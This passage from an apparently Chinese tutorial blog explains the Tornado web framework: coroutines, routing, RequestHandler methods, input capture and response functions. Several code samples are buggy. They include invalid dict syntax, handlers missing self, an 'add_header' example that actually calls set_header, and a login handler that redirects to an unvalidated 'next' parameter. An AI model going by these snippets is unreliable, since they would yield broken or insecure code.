class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado <span class="keyword">import</span> gen<span class="comment"># 引入协程库</span></span><br><span class="line"><span class="keyword">from</span> tornado.httpclient <span class="keyword">import</span> AsyncHTTPClient</span><br><span class="line"></span><br><span class="line"><span class="meta">@gen.coroutine# 使用gen.coroutine修饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine_visit</span><span class="params">()</span>:</span></span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    dict_response = <span class="keyword">yield</span>[ <span class="string">"baidu"</span>: http_client.fetch(<span class="string">"www.baidu.com"</span>),</span><br><span class="line">                         <span class="string">"sina"</span>: http_client.fetch(<span class="string">"www.sina.com"</span>),</span><br><span class="line">                        <span class="string">"163"</span>: http_client.fetch(<span class="string">"www.163.com"</span>),</span><br><span class="line">                        <span class="string">"google"</span>: http_client.fetch(<span class="string">"www.google.com"</span>)</span><br><span class="line">                         ]</span><br><span class="line"> <span class="keyword">print</span> dict_response[<span class="string">"sina"</span>].body</span><br></pre></td></tr></tbody></table></figure><p>​    本例中以字典形式给yield关键字传递异步调用要求，并且Tornado以字典形式返回异步调用的结果。</p><h3 id="Tornado框架知识"><a href="#Tornado框架知识" class="headerlink" title="Tornado框架知识"></a>Tornado框架知识</h3><h4 id="Tornado概述"><a href="#Tornado概述" class="headerlink" title="Tornado概述"></a>Tornado概述</h4><p>​    Tornado全称是Tornado Web Server，是一个用Python语言写成的Web服务器兼网络框架。特点和性能总结如下：</p><p>​    <strong>特点：</strong></p><ul><li><p>轻量级的Web框架，其拥有异步非阻塞IO的处理方式。</p></li><li><p>作为Web服务器，Tornado有较为出色的抗负载能力，官方用Nginx反向代理的方式部署Tornado和其它Python Web应用框架，为了最大化的利用Tornado的性能，推荐同时使用tornado和其它Python Web应用框架进行对比，结果最大浏览量超过第二名近40%.</p><p><strong>性能：</strong></p></li><li><p>Tornado性能优异，它试图解决 <a href="https://www.jianshu.com/p/ba7fa25d3590" target="_blank" rel="noopener">C10K</a>问题，即处理大于或等于一万的并发连接。</p><p>Tornado框架和服务器一起可以组成一个WSGI的全栈替代品，如果单独在WSGI容器中使用tornado网络框架或者tornaod http服务器 ，存在一定的局限性。为了最大化的利用tornado的性能，推荐同时使用tornado+HTTP服务器。 </p></li></ul><h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><ul><li><p>用户量大，高并发</p><p>如秒杀抢购，双11某宝购物、春节抢火车票等。</p></li><li><p>大量的HTTP持久连接</p></li></ul><p>​        使用同一个TCP连接来发送和接收多个HTTP请求 or 应答，而不是为每一个请求 or 应答打开新的连接的方法。</p><p>​    对于HTTP 1.0，可以在请求的包头(Header)中添加Connection:Keep-Alive。</p><p>​    对于HTTP 1.1，所有的连接默认为持久连接。</p><h4 id="Tornado与Django比较"><a href="#Tornado与Django比较" class="headerlink" title="Tornado与Django比较"></a>Tornado与Django比较</h4><p>​    <strong>Tornado</strong></p><p>​    Tornado走的是少而精的方向，注重的是性能优越，最为出名的是它的异步非阻塞的设计方式。</p><ul><li><p>HTTP服务器</p></li><li><p>异步编程</p></li><li><p>WebSocket</p><p><strong>Djangoo</strong></p><p>Django走的是大而全的方向，注重开发高效，最为出名的是它自动化的管理后台，只需要使用起ORM，做简单的对象定义，它就能自动生成数据库，以及功能齐全的管理后台。</p><p>Django所提供的方便，意味着Django内置的ORM跟框架内的其他模块耦合度高，应用程序必须使用Django内置的ORM，否则就不能享受到框架内提供的种种基于ORM的便利。</p></li><li><p>Session功能</p></li><li><p>后台管理</p></li><li><p>ORM</p></li></ul><h4 id="简单Tornado示例"><a href="#简单Tornado示例" class="headerlink" title="简单Tornado示例"></a>简单Tornado示例</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> tornado.httpserver</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tornado.options <span class="keyword">import</span> define,options</span><br><span class="line">define(<span class="string">"port"</span>,default=<span class="number">8000</span>,help=<span class="string">"run on the given port"</span>,type=int)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">'''主路由处理类'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''对应http的get请求方式'''</span></span><br><span class="line">        greeting = self.get_argument(<span class="string">'greeting'</span>,<span class="string">'Hello'</span>)</span><br><span class="line">        self.write(greeting + <span class="string">', tornado!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    tornado.options.parse_command_line()</span><br><span class="line">    app = tornado.web.Application(handlers=[(<span class="string">r"/"</span>,IndexHandler)])</span><br><span class="line">    http_server = tornado.httpserver.HTTPServer(app)</span><br><span class="line">    http_server.listen(options.port)</span><br><span class="line">    tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></tbody></table></figure><p>上述代码解释说明：</p><p><strong>tornado的基础Web框架模块</strong></p><ul><li><p>RequestHandler</p><p>封装了对应一个请求的所有信息和方法，write(响应信息)就是写响应信息的一个方法；对应每一种http请求方式(get、post等)，把对应的处理逻辑写进同名的成员方法中(如对应get请求方式，就将对应的处理逻辑写在get()方法中)，当没有对应请求方式的成员方法时，会返回“405: Method Not Allowed”错误。 </p></li><li><p>Application</p><p>Tornado Web框架的核心应用类，是与服务器对接的接口，里面保存了路由信息表，其初始化接收的第一个参数就是一个路由信息映射元组的列表；其listen(端口)方法用来创建一个http服务器实例，并绑定到给定端口(注意：此时服务器并未开启监听)。</p></li></ul><h4 id="Tornado核心IOLoop循环模块"><a href="#Tornado核心IOLoop循环模块" class="headerlink" title="Tornado核心IOLoop循环模块"></a>Tornado核心IOLoop循环模块</h4><p>​    tornado的核心io循环模块，封装了Linux的epoll和BSD的kqueue，也是tornado高性能的基石。以Linux的epoll为例，其原理如下图：</p><p>​    <img src="https://img-blog.csdn.net/20170801190522372?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxNDc0NTE5NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><p>​    针对具体实例，访问路径如下图：</p><p><img src="https://img-blog.csdn.net/20170801190533158?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxNDc0NTE5NA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p><ul><li>IOLoop.current()返回当前线程的IOLoop实例。</li><li>IOLoop.start() 启动IOLoop实例的I/O循环，同时服务器监听被打开。</li></ul><p>2.6 Tornado Web程序编写思路</p><ol><li>创建Web应用实例对象，第一个初始化参数为路由映射列表。</li><li>定义实现路由映射表中的handler类。</li><li>创建服务器实例，绑定服务器端口。</li><li>启动当前线程的IOLoop。</li></ol><h3 id="开发Tornado网站"><a href="#开发Tornado网站" class="headerlink" title="开发Tornado网站"></a>开发Tornado网站</h3><p>​    下面会展示使用Tornado建立Web站点的方法。</p><h4 id="网站结构"><a href="#网站结构" class="headerlink" title="网站结构"></a>网站结构</h4><p>​    通过编写hellowowld学习Tornado网站的基本结构：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.write(<span class="string">"Hello World!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([(<span class="string">r"/"</span>,MainHandler),])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">8888</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>​    下面逐行解析上面的代码做了些什么。</p><p>​    (1) 首先是通过import语句引入tornado包中ioloop和web类。引入这两个类是Tornado程序的基础。</p><p>​    (2) 实现一个web.RequestHandler子类，重载其中的get()函数，该函数负责相应定位到该Request</p><p>Handler的HTTP GET请求的处理。本例中简单的使用self.write()函数输出hello world。</p><p>​    (3) 定义了make_app()函数，该函数返回一个web.Application对象。该对象的第1个参数用于定义Tornado程序的路由映射。本例中将对根URL的访问映射到了RequestHandler子类MainHandler中。</p><p>​    (4) 用web.Application.listen()函数指定服务器监听的端口。</p><p>​    (5) 用tornado.ioloop.IOLoop.current().start()启动IOLoop，该函数将一直运行且不退出，用于处理完所有的客户端的访问请求。</p><h4 id="路由解析"><a href="#路由解析" class="headerlink" title="路由解析"></a>路由解析</h4><p>​    向web.Application对象传递的第1个参数URL路由映射列表的配置方式与Django类似，用正则字符串进行路由匹配。Tornado的路由字符串有两种，固定字符路径和参数字串路径。</p><ul><li><p><strong>固定字串路径</strong></p><p>固定子串是普通的字符串固定匹配，比如：</p></li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Handlers = [(<span class="string">"/"</span>,MainHandler),<span class="comment">#只匹配根路径</span></span><br><span class="line">            (<span class="string">"/entry"</span>,EntryHandler),<span class="comment">#只匹配/entry</span></span><br><span class="line">            (<span class="string">"/entry/2015"</span>,Entry2015Handler)<span class="comment">#只匹配/entry/2015</span></span><br><span class="line">           ]</span><br></pre></td></tr></tbody></table></figure><ul><li><strong>参数字串路径</strong></li></ul><p>​        参数字串可以将具备一定模式的路径映射到同一个RequestHandler中处理，其中路径中的参数部分用小括号”()”标识，下面是一个参数路径的例子：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url handler</span></span><br><span class="line">handlers = [(<span class="string">r"/entry/([^/]+)"</span>,EntryHandler),]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EntryHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self,slug)</span>:</span></span><br><span class="line">        entry = self.db.get(<span class="string">"SELECT * FROM entries WHERE slug = %s"</span>,slug)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> entry:</span><br><span class="line">            <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">404</span>)</span><br><span class="line">        self.render(<span class="string">"entry.html"</span>,entry=entry)</span><br></pre></td></tr></tbody></table></figure><p>​    例中用 <code>"/entry/([^/]+)"</code> 定义以/entry/开头的URL模式。小括号的内容是正则表达式，URL尾部的变量部分以参数形式传递给RequestHandler中的get()函数，本例中将该参数命名为slug。</p><ul><li><strong>带默认值的参数路径</strong></li></ul><p>​       之前例子中的<code>handlers = [(r"/entry/([^/]+)",EntryHandler),]</code>模式定义了客户端必须输入路径参数。比如，其能够匹配如下路径：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xx.xx.xx.xx/entry/abc</span><br><span class="line">http://xx.xx.xx.xx/entry/<span class="number">2019</span><span class="number">-03</span><span class="number">-10</span></span><br></pre></td></tr></tbody></table></figure><p>​    但是其无法匹配，<code>http://xx.xx.xx.xx/entry</code> ，</p><p>​    对于需要匹配客户端未传入时的路径，则需要用如下方法改变URL路径和对get()函数的定义：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url handler</span></span><br><span class="line">handlers = [(<span class="string">r"/entry/([^/]*)"</span>,EntryHandler),]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EntryHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self,slug=<span class="string">'default'</span>)</span>:</span></span><br><span class="line">        entry = self.db.get(<span class="string">"SELECT * FROM entries WHERE slug = %s"</span>,slug)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> entry:</span><br><span class="line">            <span class="keyword">raise</span> tornado.web.HTTPError(<span class="number">404</span>)</span><br><span class="line">        self.render(<span class="string">"entry.html"</span>,entry=entry)</span><br></pre></td></tr></tbody></table></figure><p>​    本例中首先用星号”*”取代加号”+”定义了URL模式，然后为RequestHandler子类的get()函数的slug参数配置了默认值default。</p><ul><li><p><strong>多参数路径</strong> </p><p>参数路径还允许在一个URL模式中定义多个可变参数，比如：</p></li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">handlers = [</span><br><span class="line">    (<span class="string">r'/(\d{4})/(\d{2})/(\d{2})/([a-zA-Z\-0-9\.:,_]+)/?'</span>,DetailHandler)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, year, month, day, slug)</span>:</span></span><br><span class="line">        self.write(<span class="string">"%d-%d-%d %s"</span>%(year, month, day, slug))</span><br></pre></td></tr></tbody></table></figure><p>​    本例中的URL模式定义了year、month、day、slug等4个参数。</p><h4 id="RequestHandler"><a href="#RequestHandler" class="headerlink" title="RequestHandler"></a>RequestHandler</h4><p>​    经过前面的学习，大致了解到RequestHandler类在Tornado网站程序中的重要作用，它是配置和响应URL请求的核心类，下面将介绍RequestHandler的更多内容。</p><ul><li><strong>接入点函数</strong>     </li></ul><p>​        需要子类继承并定义具体行为的函数在RequestHandler中被称为接入点函数(Entry Point)，之前常用的get()函数就是典型的接入点函数。其它可用的接入点函数如下所述。</p><p>​    （1）RequestHandler.initialize()</p><p>​    该方法被子类重写，实现了RequestHandler子类实例的初始化过程。可以将该函数传递参数，参数来源于配置URL映射时的定义。比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tornado.web <span class="keyword">import</span> RequestHandler</span><br><span class="line"><span class="keyword">from</span> tornado.web <span class="keyword">import</span> Application</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfileHandler</span><span class="params">(RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(self,database)</span>:</span></span><br><span class="line">        self.database = database</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Application([(<span class="string">r'/account'</span>,ProfileHandler,dict(database=<span class="string">"c:\\example.db"</span>)),])</span><br></pre></td></tr></tbody></table></figure><p>​    本例中的initialize有参数database，该参数由Application定义URL映射时以dict形式给出。</p><p>​    （2）RequestHandler.prepare()、RequestHandler.on_finish()</p><p>​    prepare()方法用于调用请求处理(get、post等)方法之前的初始化处理，而on_finish()用于请求处理结束后的一些清理工作，这两种方法一个在处理前，一个在处理后，可以根据实际需要进行重写。通常prepare()方法做资源初始化操作，而用on_finish()方法可做清理对象占用的内存或者关闭数据库连接等工作。</p><p>​    （3）HTTP Action处理函数</p><p>​    每个HTTP Action在RequestHandler中都以单独的函数进行处理。</p><ul><li><p>RequestHandler.get(*args,**kargs)</p></li><li><p>RequestHandler.head(*args,**kargs)</p><p>RequestHandler.post(*args,**kargs)    </p></li><li><p>RequestHandler.delete(*args,**kargs)</p></li><li><p>RequestHandler.patch(*args,**kargs)</p></li><li><p>RequestHandler.put(*args,**kargs)</p><p>RequestHandler.options(*args,**kargs)    </p><p>每个处理函数都以它们对应的HTTP Action小写的方式命名。</p><p>   <strong>输入捕获</strong>     </p></li></ul><p>​        输入捕获是指在RequestHandler中获取客户端输入的工具函数和属性，比如获取URL查询字符串、POST提交参数等。</p><p>​      （1）RequestHandler.get_argument(name)、RequestHandler.get_arguments(name)</p><p>​    都是返回给定参数的值。get_argument获得单个值；而get_arguments是针对参数存在多个值的情况下使用的，返回多个值的列表。用get_argument/get_arguments()方法获取的是URL查询字符串参数与Post提交参数的参数合集。</p><p>​    (2) RequestHandler.get_query_argument(name)、RequestHandler.get_query_argument</p><p>(name)</p><p>​    它们与get_argument、get_arguments的功能类似，但是仅从URL查询参数中获取参数值。</p><p>​    (3)RequestHandler.get_body_argument(name)、RequestHandler.get_body_arguments</p><p>(name)</p><p>​    与get_argument、get_arguments的功能类似，但是仅从Post提交参数中获取参数值。</p><p>​    一般来说，使用get_argument/get_arguments即可。因为它们是get_query_argument/get_query_arguments和get_body_argument/get_body_arguments的合集。</p><p>​    (4)RequestHandler.get_cookie(name,default=None)</p><p>​    根据Cookie名称获取Cookie值。</p><p>​    (5)RequestHandler.request</p><p>​    返回tornado.httputil.HTTPServerRequest对象实例的属性，通过该对象可以获取关于HTTP请求的一切信息。比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">        remote_ip = self.request.remote_ip<span class="comment">#获取客户端IP地址</span></span><br><span class="line">        host = self.request.host<span class="comment">#获取请求的主机地址</span></span><br></pre></td></tr></tbody></table></figure><p>​    常用的httputil.HTTPServerRequest对象属性如下表所示：</p><table><thead><tr><th style="text-align:center">属性名</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">method</td><td style="text-align:center">HTTP请求方法，比如GET、POST等</td></tr><tr><td style="text-align:center">url</td><td style="text-align:center">客户端请求的url的完整内容</td></tr><tr><td style="text-align:center">query</td><td style="text-align:center">url中的查询字符串</td></tr><tr><td style="text-align:center">version</td><td style="text-align:center">客户端发送请求时使用的HTTP版本，比如HTTP/1.1</td></tr><tr><td style="text-align:center">headers</td><td style="text-align:center">以字典方式表达的HTTP Headers</td></tr><tr><td style="text-align:center">body</td><td style="text-align:center">以字符串方式表达的HTTP消息体</td></tr><tr><td style="text-align:center">remote_ip</td><td style="text-align:center">客户端的IP地址</td></tr><tr><td style="text-align:center">Protocol</td><td style="text-align:center">请求协议，比如HTTP、HTTPS</td></tr><tr><td style="text-align:center">host</td><td style="text-align:center">请求消息中的主机名</td></tr><tr><td style="text-align:center">arguments</td><td style="text-align:center">客户端提交的所有参数</td></tr><tr><td style="text-align:center">files</td><td style="text-align:center">以字典方式表达的客户端上传的文件，每个文件名对应一个HTTPFile</td></tr><tr><td style="text-align:center">cookies</td><td style="text-align:center">客户端提交的cookie字典</td></tr><tr><td style="text-align:center"></td></tr></tbody></table><ul><li><strong>输出响应函数</strong></li></ul><p>​        输出响应函数是指一组为客户端生成处理结果的工具函数，开发者调用它们以控制URL的处理结果。常用的输出相应函数如下。</p><p>​    (1) RequestHandler.set_status(status_code,reason=None)</p><p>​    设置HTTP Resource中的返回码，如果有描述性的语句，则可以赋值给reason参数。</p><p>​    (2)RequestHandler.set_header(name,value)</p><p>​    以键值对的方式配置HTTP Response中的HTTP头参数。使用set_header配置的Header值将覆盖之前配置的Header，比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">        self.set_header(<span class="string">"NUMBER"</span>,<span class="number">9</span>)</span><br><span class="line">        self.set_header(<span class="string">"LANGUAGE"</span>,<span class="string">"France"</span>)</span><br><span class="line">        self.set_header(<span class="string">"LANGUAGE"</span>,<span class="string">"Chinese"</span>)</span><br></pre></td></tr></tbody></table></figure><pre><code>本例中的get()函数调用了3次set_header，但是只配置了两个header参数，最后的HTTP Header中的参数将会是：</code></pre><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NUMBER: <span class="number">9</span></span><br><span class="line">LANGUAGE: Chinese</span><br></pre></td></tr></tbody></table></figure><p>​    (3)RequestHandler.add_header(name,value)</p><p>​    以键值对的方式设置HTTP Response中的HTTP头参数。与set_header不同的是add_header配置的Header值将不会覆盖之前配置的Header，比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">        self.set_header(<span class="string">"NUMBER"</span>,<span class="number">8</span>)</span><br><span class="line">        self.set_header(<span class="string">"LANGUAGE"</span>,<span class="string">"France"</span>)</span><br><span class="line">        self.set_header(<span class="string">"LANGUAGE"</span>,<span class="string">"Chinese"</span>)</span><br></pre></td></tr></tbody></table></figure><p>​    最后HTTP Header中的参数将会是：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NUMBER: <span class="number">8</span></span><br><span class="line">LANGUAGE: France   </span><br><span class="line">LANGUAGE: Chinese</span><br></pre></td></tr></tbody></table></figure><p>​    (4)RequestHandler.write(chunk)</p><p>​    将给定的块作为HTTP Body发送给客户端。在一般情况下，用本函数输出字符串给客户端，如果给定的块是一个字典，则会将这个块以JSON格式发送给客户端，同时将HTTP header中的Content_type设置成application/json。</p><p>​    (5)RequestHandler.finish(chunk=None)</p><p>​    本方法通知Tornado:Response的生成工作已完成，chunk参数是需要传递给客户端的HTTP body。调用finish()后，Tornado将向客户端发送HTTP Response。本方法适用于对RequestHandler的异步请求处理，异步请求的具体方法详见3.4节。</p><p>注意：在同步或协程访问处理的函数中，无需调用finish()函数。</p><p>​    (6)RequestHandler.render(template_name, **kwargs)</p><p>​    用给定的参数渲染模板，可以在本函数中传入模板文件名称和模板参数，比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        items = [<span class="string">"Python"</span>,<span class="string">"C++"</span>,<span class="string">"Java"</span>]</span><br><span class="line">        self.render(<span class="string">"template.html"</span>,title=<span class="string">"Tornado Template"</span>,items=items)</span><br></pre></td></tr></tbody></table></figure><p>​    render()的第1个参数是对模板文件的命名，之后以命名参数的形式传入多个模板参数。Tornado的基本模板语法和Django相同，功能上弱化，高级过滤器不可用。</p><p>​    (7) RequestHandler.redirect(url,permanent=False,status=None)</p><p>​    进行页面重定向。在RequestHandler处理过程中，可以随时调用redirect()函数进行页面重定向，比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.render(<span class="string">"login.html"</span>,next=self.get_argument(<span class="string">"next"</span>,<span class="string">"/"</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span></span><br><span class="line">        username = self.get(<span class="string">"username"</span>,<span class="string">""</span>)</span><br><span class="line">        password = self.get(<span class="string">"password"</span>,<span class="string">""</span>)</span><br><span class="line">        auth = self.db.authenticate(username, password)</span><br><span class="line">        <span class="keyword">if</span> auth:</span><br><span class="line">            self.set_current_user(username)</span><br><span class="line">            self.redirect(self.get_argument(<span class="string">"next"</span>,<span class="string">u"/"</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            error_msg = <span class="string">u"?error="</span> + tornado.escape.url_escape(<span class="string">"Login incorrect."</span>)</span><br><span class="line">            self.redirect(<span class="string">u"/login"</span> + error_msg)</span><br></pre></td></tr></tbody></table></figure><p>​    在本例LoginHandler的post处理函数中，根据验证是否成功将客户端重定向到不同的页面，如果成功则重定向到next参数所指向的URL；如果不成功，则重定向到”/login”页面。</p><p>​    (8) RequestHandler.clear()</p><p>​    清空所有在本次请求中之前写入的Header和Body内容，比如：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">        self.set_header(<span class="string">"NUMBER"</span>,<span class="number">8</span>)</span><br><span class="line">        self.clear()</span><br><span class="line">        self.set_header(<span class="string">"LANGUAGE"</span>,<span class="string">"France"</span>)</span><br></pre></td></tr></tbody></table></figure><p>​    (9) RequestHandler.set_cookie(name,value)</p><p>​    按键值对设置Response中的Cookie值。</p><p>​    (10) 